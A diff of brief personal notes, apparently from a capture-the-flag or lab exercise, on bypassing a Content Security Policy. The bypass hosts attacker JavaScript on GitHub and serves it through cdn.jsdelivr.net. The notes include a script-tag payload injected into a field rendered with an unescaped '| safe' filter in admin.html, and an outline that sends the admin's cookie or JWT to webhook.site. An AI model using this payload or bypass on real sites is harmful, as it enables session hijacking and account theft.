@@ -1,6 +1,5 @@
 CSP (Content Security Policy)
 -------------------------------
-
 CSP allows website administrators to define and enforce a set of rules that dictate which sources of content can be considered trustworthy and should be executed or displayed by the browser.
 
 CSP can be seen in the Response header 
@@ -10,7 +9,7 @@ script-src 'self' https://cdn.jsdelivr.net directive allows JavaScript to be exe
 
 Can also check CSP rules in CSP Evaluator(https://csp-evaluator.withgoogle.com/)
 
-****Using https://cdn.jsdelivr.net can be dangerous***** because we can fetch javascript code from our github.
+****Using https://cdn.jsdelivr.net can be dangerous**** because we can fetch javascript code from our github.
 
 https://cdn.jsdelivr.net/gh/user/repo@version/file (original)
 https://cdn.jsdelivr.net/gh/AlPha0ne1/holloween/project.js (from my github)
@@ -25,12 +24,8 @@ In website name (using safe)
 ----------------
 <script src = "https://cdn.jsdelivr.net/gh/AlPha0ne1/holloween/project2.js"></script>
 
-https://cdn.jsdelivr.net/gh/AlPha0ne1/holloween/project2.js > webhook.site > get cookie.
-
-
-______________________________________________________________________________________________________________________
-
-
+https://cdn.jsdelivr.net/gh/AlPha0ne1/holloween/project2.js > webhook.site > get cookie(JWT token) > Decrypt and get cookie.
+______________________________________________________________________________________________________________________________________________
 In admin.html
 <div class="card-header"> <strong>Halloween Name</strong> : {{ request.halloween_name | safe }} </div>
 
